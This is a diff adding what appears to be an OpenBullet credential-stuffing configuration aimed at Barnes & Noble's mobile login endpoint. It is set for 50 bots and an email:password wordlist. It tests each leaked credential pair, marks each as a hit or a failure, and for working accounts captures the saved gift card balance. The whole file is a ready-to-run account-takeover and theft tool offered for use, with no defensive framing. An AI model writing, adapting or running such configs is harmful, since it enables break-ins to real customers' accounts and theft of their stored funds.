@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Barnes and Nobles",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-27T16:46:35.04891+00:00",
+  "AdditionalInfo": "",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://m.barnesandnoble.com/skavastream/xact/v5/barnesandnoble/login?campaignId=772" AutoRedirect=TRUE 
+  CONTENT "userinfo={\"userName\":\"<USER>\",\"password\":\"<PASS>\"}&customparams={\"_dyncharset\":\"UTF-8\",\"_dynSessConf\":\"\",\"/atg/userprofiling/ProfileFormHandler.value.autoLogin\":\"true\",\"amplifiHandler\":\"/atg/userprofiling/ProfileFormHandler.login\",\"getData\":\"profile\",\"_DARGS\":\"/account/login-frame-ra.jsp\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://m.barnesandnoble.com/account/login-frame-ra.jsp?tplName=&parentUrl=https%3a%2f%2fm.barnesandnoble.com%2f&isCheckout=&isNookLogin=&isEgift=&customerkey=&intent=&emailSub=&membershipIDLink=&sk_custom_page=true" 
+  HEADER "origin: https://m.barnesandnoble.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\":{\"state\":{\"status\":\"success\"},\"userinfo\":[{\"userid\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "\":{\"errors\":[{\"errormessage\":\"Your email and password combination does not match our records. Please try again.\"" 
+    KEY "status\":\"failure\"}}}" 
+REQUEST GET "m.barnesandnoble.com/account/giftcard/manage/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://m.barnesandnoble.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You don't have any gift cards saved" 
+PARSE "<SOURCE>" LR "<td class=\"giftcard-total fw-medium\">" "</td" Recursive=FALSE -> CAP "GiftCard Balance" "" "" 
